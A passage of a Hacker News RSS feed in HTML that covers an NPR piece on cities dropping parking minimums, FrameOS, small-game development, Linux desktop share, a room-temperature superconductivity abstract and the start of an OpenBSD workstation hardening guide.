https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s600-c85.webp 600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s800-c85.webp 800w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s900-c85.webp 900w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1200-c85.webp 1200w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1600-c85.webp 1600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1800-c85.webp 1800w" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/webp">
            <source srcset="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s400-c85.jpg 400w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s600-c85.jpg 600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s800-c85.jpg 800w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s900-c85.jpg 900w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1200-c85.jpg 1200w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1600-c85.jpg 1600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1800-c85.jpg 1800w" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/jpeg">
            <img src="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1100-c50.jpg" alt="" loading="lazy">
        </picture>
        
</div>
<div>
    <div>
        <p>
                San Francisco is one of many U.S. cities that has thrown out its parking minimums in recent years.
                <b aria-label="Image credit">
                    
                    Justin Sullivan/Getty Images
                    
                </b>
                <b><b>hide caption</b></b>
            </p>


            <p><b><b>toggle caption</b></b>
    </p></div>

    <p><span aria-label="Image credit">
        
        Justin Sullivan/Getty Images
        
    </span>
</p></div>
<div>
        <picture>
            <source data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1200.webp" type="image/webp">
            <source data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1200.jpg" type="image/jpeg">
            <img data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1200.jpg" alt="" src="https://media.npr.org/assets/img/2023/12/24/gettyimages-1215791007_custom-aeca921e5edc5c55659fee2b3ac90b9d508ff38b-s1200.jpg">
        </picture>
    </div>
<div>
        <p>San Francisco is one of many U.S. cities that has thrown out its parking minimums in recent years.</p>
        <p><span aria-label="Image credit">
            
            Justin Sullivan/Getty Images
            
        </span>
    </p></div>
   </div>
   <p>Random as these rules can be, they have major consequences: Parking creates sprawl and makes neighborhoods less walkable. Asphalt traps heat and creates runoff. And parking minimums can add <em>major</em> costs to building new housing: a single space in a parking structure can cost $50,000 or more.</p>   
   <p><a href="https://www.accessmagazine.org/spring-2017/the-hidden-cost-of-bundled-parking/">One 2017 study</a> found that including garage parking increased the rent of a housing unit by about 17 percent.</p>   
   
<!-- END ID="RES1221847238" CLASS="BUCKETWRAP INTERNALLINK MEDIAPROMO PRIMARY" -->
   <p>The real problem, says Jordan, is what <em>doesn't</em> get built: "The housing that could have gone in that space or the housing that wasn't built because the developer couldn't put enough parking. ... So we just lose housing in exchange for having convenient places to store cars."</p>   <h3>A move to let the market decide</h3>   <p>Austin City Council member Zo Qadri was the lead sponsor on the resolution to remove parking mandates there. He emphasizes that getting rid of parking mandates isn't the same thing as getting rid of parking: "It simply lets the market and individual property owners decide what levels of parking are appropriate or needed." </p>   <p>Austin removed parking requirements for its downtown area a decade ago, "and the market has still provided plenty of parking in the vast majority of the projects since then," says Qadri.</p>   <p>A new survey from Pew Charitable Trusts <a href="https://www.pewtrusts.org/-/media/assets/2023/11/zoning-survey-toplines-and-methods.pdf">found that 62% of Americans</a> support property owners and builders to make decisions about the number of off-street parking spaces, instead of local governments.</p>   <p>Angela Greco, a 36-year-old musician and copywriter in Austin, is one of them. She drives, but prefers to walk or take transit. She's not worried that doing away with the old rules will make it too hard to find a place to park.</p>   <p>"I've lived in like cities where it's way more difficult, like New York and L.A.," Greco says. "Parking just isn't that difficult in Austin to me to begin with, even in really dense areas."</p>   <div id="res1221480741">
            <div data-crop-type="">
        <picture>
            <source srcset="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s400-c85.webp 400w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s600-c85.webp 600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s800-c85.webp 800w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s900-c85.webp 900w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1200-c85.webp 1200w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1600-c85.webp 1600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1800-c85.webp 1800w" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/webp">
            <source srcset="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s400-c85.jpg 400w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s600-c85.jpg 600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s800-c85.jpg 800w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s900-c85.jpg 900w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1200-c85.jpg 1200w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1600-c85.jpg 1600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1800-c85.jpg 1800w" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/jpeg">
            <img src="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1100-c50.jpg" alt="" loading="lazy">
        </picture>
        
</div>
<div>
    <div>
        <p>
                Many cities hope that ditching their parking requirements will make their neighborhoods more amenable to biking and walking. People are seen biking and walking along Park Avenue near Grand Central Station during the Summer Streets initiative in New York City in August 2022.
                <b aria-label="Image credit">
                    
                    Ed Jones/AFP via Getty Images
                    
                </b>
                <b><b>hide caption</b></b>
            </p>


            <p><b><b>toggle caption</b></b>
    </p></div>

    <p><span aria-label="Image credit">
        
        Ed Jones/AFP via Getty Images
        
    </span>
</p></div>
<div>
        <picture>
            <source data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1200.webp" type="image/webp">
            <source data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1200.jpg" type="image/jpeg">
            <img data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1200.jpg" alt="" src="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1200.jpg">
        </picture>
    </div>
<div>
        <p>Many cities hope that ditching their parking requirements will make their neighborhoods more amenable to biking and walking. People are seen biking and walking along Park Avenue near Grand Central Station during the Summer Streets initiative in New York City in August 2022.</p>
        <p><span aria-label="Image credit">
            
            Ed Jones/AFP via Getty Images
            
        </span>
    </p></div>
   </div>
   <p>She says the question of whether the city invests in transit and walkability, or doubles down on cars, is decisive in whether she'll live in Austin long-term.</p>   <p>"Like if it doesn't seem like the public transit's going to get better, and if it seems like <a href="https://www.kut.org/transportation/2023-10-16/austin-i-35-expansion-displacements">the highway expansion</a> is going to happen, then I'm probably going to start looking for where else I can live. ... It's a major factor in my life and my happiness. Like sometimes I'm driving on the road and I'll be in traffic or something or even just on the highway, and it's such an ugly landscape," Greco says. "And then I'll think: this isn't really how I want to spend my adult life."</p>   
   <h3>Too much parking can hinder effective transit</h3>   <p>What about the idea that cities without good transit can't cut back on parking?</p>   <p>Jonathan Levine, a professor of urban and regional planning at the University of Michigan who studies transportation policy reform, says cities' parking minimums can make good transit nearly impossible to develop.</p>   <p>"An area that has a lot of parking is transit-hostile territory," he says.</p>   <p>He explains why: When people take transit, they complete their journey by walking to their destination. A sea of parking at the destination makes that walk longer, and it makes the physical environment less appealing to those on foot. </p>   
   
<!-- END ID="RES1221847671" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>"Who wants to walk by a bunch of parking lots to get to your destination?" Levine notes.</p>   <p>And having tons of parking encourages driving. "If you have parking everywhere that you're going, that parking essentially is calling to the drivers, drive here! Park here! ... So if you keep on designing those areas by governmental mandate, you're creating areas that transit can't serve effectively," says Levine.</p>   <p>Many more U.S. cities ‚Äì including <a href="https://www.nyc.gov/office-of-the-mayor/news/692-23/mayor-adams-launches-historic-effort-build-a-little-more-housing-every-neighborhood-">New York City</a>, <a href="https://www.wpr.org/milwaukee-zoning-code-housing-growing-mke">Milwaukee</a>, and <a href="https://www.keranews.org/news/2023-09-06/dallas-officials-discussing-possible-elimination-of-minimum-parking-requirements-in-the-city">Dallas</a> ‚Äî are exploring getting rid of their parking minimums too. Duluth, Minn., lifted its parking mandates <a href="https://www.duluthnewstribune.com/news/local/duluth-lifts-parking-mandates-looks-to-sell-pair-of-ramps">in December</a>.</p>   <p>Levine says getting rid of these rules is good news for cities.</p>   <p>"It's a huge drag on housing affordability. And it's a huge impediment for cities fulfilling their destiny, which is enabling human interaction. Because what parking does is it separates land uses, separates people. It makes cities have a much more sprawling physical profile than they otherwise would have."</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: FrameOS ‚Äì operating system for single function smart frames (308 pts)]]></title>
            <link>https://frameos.net/</link>
            <guid>38855337</guid>
            <pubDate>Wed, 03 Jan 2024 15:42:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://frameos.net/">https://frameos.net/</a>, See on <a href="https://news.ycombinator.com/item?id=38855337">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>FrameOS is an <strong>operating system for single function smart frames</strong>. </p><p>It's meant to be deployed on a Raspberry Pi, and can be used with a variety of e-ink and traditional displays. It's designed for both screens that update <strong>60 seconds per frame</strong>, and for screens that update <strong>60 frames per second</strong>.</p><p>Think smart home calendars, meeting room displays, thermostats, industrial dashboards, public advertisement screens, and more. </p><p>Features:</p><ol><li><p><strong>Centralized Deployment:</strong> The FrameOS Controller connects to Raspberry Pis via SSH for direct software installation.</p></li><li><p><strong>Compiled &amp; Efficient</strong>: FrameOS is written <a href="https://nim-lang.org/" target="_blank" rel="noopener noreferrer">in Nim</a>, a compiled language. Your final configuration gets compiled down into a single efficient binary that contains all apps, assets and drivers.</p></li><li><p><strong>Diagram Editor</strong>: A drag-and-drop interface to combine Nim apps into scenes. Fork and edit existing apps like "OpenAI image", and "Text overlay" to suit your needs. Overwrite all fields with inline code snippets.</p></li><li><p><strong>GPT4 Support</strong>: Ask your favourite LLM to write and debug FrameOS apps for you.</p></li><li><p><strong>Hardware Guides</strong>: For tested displays, we provide hardware guides, installation instructions, and 3D printable cases.</p></li></ol><p><img loading="lazy" src="https://frameos.net/assets/images/nim-vannituba2-0faea8461e3c4fdc214704a5fea11929.png" width="3360" height="1922"></p><h2 id="getting-started">Getting started<a href="#getting-started" aria-label="Direct link to Getting started" title="Direct link to Getting started">‚Äã</a></h2><ol><li>Start by installing the <a href="https://frameos.net/installation/controller">FrameOS controller</a>.</li><li>Then set up <a href="https://frameos.net/installation/raspberry">the raspberry</a>, while following the <a href="https://frameos.net/devices">device guide</a> for your specific screen.</li></ol><h2 id="supported-platforms">Supported platforms<a href="#supported-platforms" aria-label="Direct link to Supported platforms" title="Direct link to Supported platforms">‚Äã</a></h2><p>We support all the most common e-ink displays out there.</p><ul><li>Pimoroni e-ink frames</li><li>Waveshare e-ink</li><li>Framebuffer HDMI output</li><li>Web server kiosk mode</li></ul><p><a href="https://frameos.net/devices">See the full list here!</a></p><p><img loading="lazy" alt="FrameOS Frames" src="https://frameos.net/assets/images/1-frames-d127cdd40eaec7b65932a78a7a2034ae.jpg" width="4371" height="3129"></p><h2 id="status">Status<a href="#status" aria-label="Direct link to Status" title="Direct link to Status">‚Äã</a></h2><p>FrameOS is <strong>good enough for home and hobbyist usage</strong>.</p><p>This software is still in early development, and does not have a stable release. A docker image is generated for every push to <code>main</code>. There are no guarantees things won't suddenly break between releases, despite our best efforts.</p><p>If you're the adventurous type, please try it out, and help out. Look at <a href="https://github.com/FrameOS/frameos/issues/1" target="_blank" rel="noopener noreferrer">the tasklist</a> for ideas. Don't ask for permission, just submit a PR. If you're not sure, open an issue and we'll discuss it.</p><h2 id="why">Why?<a href="#why" aria-label="Direct link to Why?" title="Direct link to Why?">‚Äã</a></h2><ul><li><p>Read the blog post: <a href="https://frameos.net/blog/why-frameos">Why FrameOS?</a></p></li><li><p>Read more about the <a href="https://frameos.net/blog/nim-rewrite">Nim rewrite</a>.</p></li></ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Making small games, which is fun in itself (235 pts)]]></title>
            <link>https://abagames.github.io/joys-of-small-game-development-en/fun_to_make_small_games.html</link>
            <guid>38854596</guid>
            <pubDate>Wed, 03 Jan 2024 14:42:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://abagames.github.io/joys-of-small-game-development-en/fun_to_make_small_games.html">https://abagames.github.io/joys-of-small-game-development-en/fun_to_make_small_games.html</a>, See on <a href="https://news.ycombinator.com/item?id=38854596">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
                                
                                
<p>Creating small games is an enjoyable endeavor in itself. So what constitutes a small game? According to the 'Small Game Manifesto', <sup><a href="#fn_1" id="reffn_1">1</a></sup> it refers to games that conclude within 10 minutes and can be easily played on browsers.</p>
<p>By this definition, I have already created over 350 small games.<sup><a href="#fn_2" id="reffn_2">2</a></sup> There was a year when I crafted 139 of these small games,<sup><a href="#fn_3" id="reffn_3">3</a></sup> showcasing my undeniable love for them.</p>
<p>Take for instance, a simple game where you slice a red stick into equal parts, which exemplifies a small game (click the image below to play directly in the browser).</p>
<p><a href="https://abagames.github.io/crisp-game-lib-11-games/?timbertest" target="_blank"><img src="https://github.com/abagames/crisp-game-lib-11-games/raw/main/docs/timbertest/screenshot.gif" alt="TIMBER TEST"></a></p>
<p>Another example is a game where you cut a rope with a tap, ensuring it doesn't touch the bottom of the screen, also a small game, enjoyable on touch panel devices like smartphones.</p>
<p><a href="https://abagames.github.io/crisp-game-lib-games/?cnodes" target="_blank"><img src="https://github.com/abagames/crisp-game-lib-games/raw/main/docs/cnodes/screenshot.gif" alt="C NODES"></a></p>
<p>The allure of small games lies in the abbreviated development time they require. A game could be quickly whipped up in about 2 hours, or within around 10 hours if met with challenges. However, once you start diving into artwork, the time investment can become endless. The small games discussed in this article are those produced under initiatives such as "Game A Week,"<sup><a href="#fn_4" id="reffn_4">4</a></sup> in which developers aim to produce a new game each week. These games, even from a developer's standpoint, are considered small due to the constrained time frame in which they are developed.</p>
<p>The abbreviated development time means you can easily experiment with various ideas. I‚Äôve enjoyed crafting and testing unconventional games.</p>
<p>The common narrative surrounding small games posits that creating them is a crucial preparatory step towards developing larger, more polished games. Many articles overwhelmingly advise beginners to start with small games.</p>
<p>A blog post titled "Make and release lots of small games before making a big one" <sup><a href="#fn_5" id="reffn_5">5</a></sup> emphasizes the importance of this practice before embarking on larger projects.</p>
<blockquote>
<p>It's here because, jumping straight into a big game as your "first" game is exactly how you end up losing motivation and never finishing that game, or ending up with something that ate years of your life that you can't even stand looking at anymore.</p>
</blockquote>
<p>But the story doesn‚Äôt end there. Small games possess a unique charm exclusive to them. That's what I believe.</p>
<p>There's a blog post titled "How To Make Good Small Games",<sup><a href="#fn_6" id="reffn_6">6</a></sup> elucidating that excellent small games do exist and detailing how to create them.</p>
<blockquote>
<p>This manifesto of sorts, ‚ÄúHow to Make Good Small Games‚Äù, is an attempt to meet this perspective halfway. It‚Äôs divided into twelve thoughts, made up mostly of esoteric creative theory (why do I like small games? why do I like making small games?), and hopefully a little actionable advice. I can tell you ‚Äúscope small uwu‚Äù, but if you don‚Äôt believe small games can be good in the first place, all you‚Äôll hear is a homework assignment you have to do before you can make the games you really care about.</p>
</blockquote>
<p>The 12 thoughts encompass the following:</p>
<ol>
<li><p>A game‚Äôs quality is independent from its scale.: Small games are not only easy to create but also to make well. The larger the game, the more aspects within it need attention, and the higher the chance of failure.</p>
</li>
<li><p>A game‚Äôs quality is independent from its emotional scope.: Just as short stories function differently from long novels or epics, the conditions constituting ‚Äúsuccess‚Äù vary in small-scale games.</p>
</li>
<li><p>A game defines the terms of its own success.: Accept them as they are, and assess whether that's good or bad.</p>
</li>
<li><p>A game succeeds when it fulfills its promises.: The introduction of new characters or mechanics is a promise. Instead of introducing an interesting idea and quickly abandoning it, ensure it evolves and contributes to the game's overall progression.</p>
</li>
<li><p>It's easier for a game to succeed if it makes smaller promises.: Reduce the mechanics, enemies, assets, characters, and stages. It's easier to introduce three ideas and develop them to a satisfying climax than to juggle 10 or 100 ideas.</p>
</li>
<li><p>Fulfill promises in an interesting and delightful way.: What makes you smile? This is where your personal style shines through in creating a game that feels authentically "you".</p>
</li>
<li><p>Don‚Äôt over-deliver on your promises.: Games should conclude at the right moment, not extending unnecessarily.</p>
</li>
<li><p>Form factor is a part of a game‚Äôs promises.: Minimize information presented to players, and ensure they can commence playing as soon as the game launches, altering player expectations.</p>
</li>
<li><p>Finish your game before releasing it.: Before releasing under labels like ‚ÄúDemo‚Äù or subtitling it ‚ÄúPrologue‚Äù, question why you would wish to release it before completion.</p>
</li>
<li><p>Serial games are not a shortcut.: Splitting the game into two or more episodes released over an extended period is almost always a bad idea.</p>
</li>
<li><p>Don‚Äôt worry about going viral.: Pursuing small, specific goals in games also attracts a small, specific audience.</p>
</li>
<li><p>Good is good enough.: Once you can consistently create games that satisfy you and feel genuinely good, you‚Äôre light-years ahead of many game developers.</p>
</li>
</ol>
<p>Additionally, the article in discussion presents a 13th thought: "Have fun :)". Conceptualize new mechanics and integrate them into your game in a manner that reflects your style. I find this process enjoyable, and it‚Äôs even more gratifying if a fair number of people experience and enjoy what I‚Äôve created.</p>
<p>Creating small games is often discussed within the context of honing game development skills. However, the process of brainstorming diverse game ideas, experimenting, riding the roller coaster of elation and disappointment, and occasionally showcasing your work to others is itself enjoyable, which is an invaluable experience.</p>
<hr>
<blockquote id="fn_1">
<sup>1</sup>. <a href="https://ebeth.itch.io/small-games-manifesto" target="_blank">Small Games Manifesto</a> for <a href="https://itch.io/jam/manifesto-jam" target="_blank">Manifesto Jam</a><a href="#reffn_1" title="Jump back to footnote [1] in the text."> ‚Ü©</a>
</blockquote>
<blockquote>
<p>Small Games should be 10 minutes or less and it's best if they're playable in a web browser.</p>
</blockquote>
<blockquote id="fn_2">
<sup>2</sup>. <a href="http://www.asahi-net.or.jp/~cs8k-cyu/" target="_blank">ABA Games</a><a href="#reffn_2" title="Jump back to footnote [2] in the text."> ‚Ü©</a>
</blockquote>
<blockquote id="fn_3">
<sup>3</sup>. <a href="https://dev.to/abagames/i-have-created-139-games-in-one-year-by-patterning-my-game-making-gc2" target="_blank">I have created 139 games in one year by patterning my game making</a><a href="#reffn_3" title="Jump back to footnote [3] in the text."> ‚Ü©</a>
</blockquote>
<blockquote id="fn_4">
<sup>4</sup>. <a href="https://www.gamedeveloper.com/audio/game-a-week-getting-experienced-at-failure" target="_blank">Game A Week: Getting Experienced At Failure</a><a href="#reffn_4" title="Jump back to footnote [4] in the text."> ‚Ü©</a>
</blockquote>
<blockquote id="fn_5">
<sup>5</sup>. <a href="https://tylerglaiel.substack.com/p/make-and-release-lots-of-small-games" target="_blank">Make and release lots of small games before making a big one</a><a href="#reffn_5" title="Jump back to footnote [5] in the text."> ‚Ü©</a>
</blockquote>
<blockquote id="fn_6">
<sup>6</sup>. <a href="https://farawaytimes.blogspot.com/2023/02/how-to-make-good-small-games.html" target="_blank">How To Make Good Small Games</a><a href="#reffn_6" title="Jump back to footnote [6] in the text."> ‚Ü©</a>
</blockquote>

                                
                                </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux hits nearly 4% desktop user share on Statcounter (227 pts)]]></title>
            <link>https://www.gamingonlinux.com/2024/01/linux-hits-nearly-4-desktop-user-share-on-statcounter/</link>
            <guid>38853877</guid>
            <pubDate>Wed, 03 Jan 2024 13:37:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.gamingonlinux.com/2024/01/linux-hits-nearly-4-desktop-user-share-on-statcounter/">https://www.gamingonlinux.com/2024/01/linux-hits-nearly-4-desktop-user-share-on-statcounter/</a>, See on <a href="https://news.ycombinator.com/item?id=38853877">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>According to Statcounter, which should be taken with a pinch of salt of course like any sampling, the Linux share on the desktop hit nearly 4% in Decemeber 2023. Last month was a record too and a clear trend over time, as going back a couple of years, it was rarely coming close to 2% but now it's repeatedly nearing 4% so it's quite a good sign overall.</p>
<p>The latest from Statcounter shows for all of 2023 below:</p>
<ul>
<li>January - 2.91%</li>
<li>February - 2.94%</li>
<li>March - 2.85%</li>
<li>April - 2.83%</li>
<li>May - 2.7%</li>
<li>June - 3.07%</li>
<li>July - 3.12%</li>
<li>August - 3.18%</li>
<li>September - 3.02%</li>
<li>October - 2.92%</li>
<li>November - 3.22%</li>
<li><strong>December - 3.82%</strong></li>
</ul>
<p>Looking at December it shows Windows rising too, with macOS dropping down. If we actually take ChromeOS directly into the Linux numbers for December 2023 the overall number would actually be 6.24% (ChromeOS is Linux after all).</p>
<p>Here's how just Linux looks over time on Statcounter since early 2009 until now:</p>
<p><a data-fancybox="images" href="https://uploads.golmedia.net/uploads/articles/article_media/996456521704281563gol1.png" target="_blank"><img src="https://uploads.golmedia.net/uploads/articles/article_media/996456521704281563gol1.png"></a></p>
<p>Seems like a pretty clear trend over time don't you think? Nice to see this happening elsewhere, just like we've seen over years <a href="https://www.gamingonlinux.com/2024/01/linux-use-on-steam-ends-2023-with-a-multi-year-high-thanks-steam-deck/" target="_blank">with the Steam Survey</a>.</p>
<p>You can see their stats <a href="https://gs.statcounter.com/os-market-share/desktop/worldwide" target="_blank">over here</a>.</p>
<p><span>Article taken from <a href="https://www.gamingonlinux.com/">GamingOnLinux.com.</a></span>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Possible Meissner effect near room temperature: copper-substituted lead apatite (517 pts)]]></title>
            <link>https://arxiv.org/abs/2401.00999</link>
            <guid>38853706</guid>
            <pubDate>Wed, 03 Jan 2024 13:19:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2401.00999">https://arxiv.org/abs/2401.00999</a>, See on <a href="https://news.ycombinator.com/item?id=38853706">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2401.00999.pdf">Download PDF</a>
    <a href="https://browse.arxiv.org/html/2401.00999v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>With copper-substituted lead apatite below room temperature, we observe diamagnetic dc magnetization under magnetic field of 25 Oe with remarkable bifurcation between zero-field-cooling and field-cooling measurements, and under 200 Oe it changes to be paramagnetism. A glassy memory effect is found during cooling. Typical hysteresis loops for superconductors are detected below 250 K, along with an asymmetry between forward and backward sweep of magnetic field. Our experiment suggests at room temperature the Meissner effect is possibly present in this material.
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Yao Yao [<a href="https://arxiv.org/show-email/3ff8ef53/2401.00999">view email</a>]      <br>    <strong>[v1]</strong>
        Tue, 2 Jan 2024 02:53:38 UTC (237 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OpenBSD Workstation Hardening (130 pts)]]></title>
            <link>https://dataswamp.org/~solene/2023-12-31-hardened-openbsd-workstation.html</link>
            <guid>38853406</guid>
            <pubDate>Wed, 03 Jan 2024 12:44:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dataswamp.org/~solene/2023-12-31-hardened-openbsd-workstation.html">https://dataswamp.org/~solene/2023-12-31-hardened-openbsd-workstation.html</a>, See on <a href="https://news.ycombinator.com/item?id=38853406">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<article id="20231231">
  <header>
  
    
    <p>Written by <em>Sol√®ne</em>, on 31 December 2023.<br>Tags: 
<span><a href="https://dataswamp.org/~solene/tag-security.html">#security</a></span>


<span><a href="https://dataswamp.org/~solene/tag-openbsd.html">#openbsd</a></span>


<span><a href="https://dataswamp.org/~solene/tag-unix.html">#unix</a></span>

</p>
    
    
  </header>
  <h2 id="_Introduction">1. Introduction <a href="#_Introduction">¬ß</a></h2>
<p>I wanted to share a list of hardening you can do on your OpenBSD workstation, and explaining the threat model of each change.
</p>
<p><a href="https://www.openbsd.org/">OpenBSD official project website</a></p>
<p>Feel free to pick any tweak you find useful for your use-case, many are certainly overkill for most people, but depending on the context, these changes could make sense for others.
</p>
<h2 id="_User_configuration">2. User configuration <a href="#_User_configuration">¬ß</a></h2>
<p>There are some tweaks that could be done in the configuration of a user to improve the security.
</p>
<h2 id="_The_Least_privileges">2.1. The Least privileges <a href="#_The_Least_privileges">¬ß</a></h2>
<p>In order to prevent a program to escalate privileges, remove yourself from the wheel group, and don't set any doas or sudo permission.
</p>
<p>If you need root privileges, switch to a TTY using the root user.
</p>
<h2 id="_Multiple-factor_authentication">2.2. Multiple-factor authentication <a href="#_Multiple-factor_authentication">¬ß</a></h2>
<p>In some cases, it may be desirable to have a multiple factor authentication, this mean that in order to log in your system, you would need a TOTP generator (phone app typically, or a password manager such as KeePassXC) in addition to your regular password.
</p>
<p>This would protect against people nearby who may be able to guess your system password.
</p>
<p>I already wrote a guide explaining how to add TOTP to an OpenBSD login.
</p>
<p><a href="https://dataswamp.org/~solene/2021-02-06-openbsd-2fa.html">Blog post: Multi-factor authentication on OpenBSD</a></p>
<h2 id="_Home_directory_permission">2.3. Home directory permission <a href="#_Home_directory_permission">¬ß</a></h2>
<p>The permissions of the user directory should be 700, so only the owner and root could browse it.
</p>
<p>Ideally, you should add <code>umask 077</code> to your user environment, so every new directory or file permissions will be restricted to your user only.
</p>
<h2 id="_Firewall">3. Firewall <a href="#_Firewall">¬ß</a></h2>
<p>There are some interesting policies to configure with the help of OpenBSD firewall Packet Filter.
</p>
<h2 id="_Block_inbound">3.1. Block inbound <a href="#_Block_inbound">¬ß</a></h2>
<p>By default, it's good practice to disable all incoming traffic except the responses to established sessions (so servers can reply to your requests).  This protects against someone on your local network / VPN to access network services that would be listening on the network interfaces.
</p>
<p>In <code>/etc/pf.conf</code> you would have to replace the default:
</p>
<pre><code>block return
pass
</code></pre>
<p>By the following:
</p>
<pre><code>block all
pass out inet
# allow ICMP because it's useful
pass in proto icmp
</code></pre>
<p>Then, reload with <code>pfctl -f /etc/pf.conf</code>, if you ever need to allow a port on the network, add the according rule in the file.
</p>
<h2 id="_Filter_outbound">3.2. Filter outbound <a href="#_Filter_outbound">¬ß</a></h2>
<p>It may be useful and effective to block outbound traffic, but this only work effectively if you know exactly what you need because you will have to allow hosts and remote ports manually.
</p>
<p>It would protect against a program trying to exfiltrate data using a non-allowed port/host.
</p>
<h2 id="_Disabling_network_for_the_desktop_user">4. Disabling network for the desktop user <a href="#_Disabling_network_for_the_desktop_user">¬ß</a></h2>
<p>Disabling network by default is an important mitigation in my opinion.  This will protect against any program your run and try to act rogue, if they can't figure there is a proxy, they won't be able to connect to the Internet.
</p>
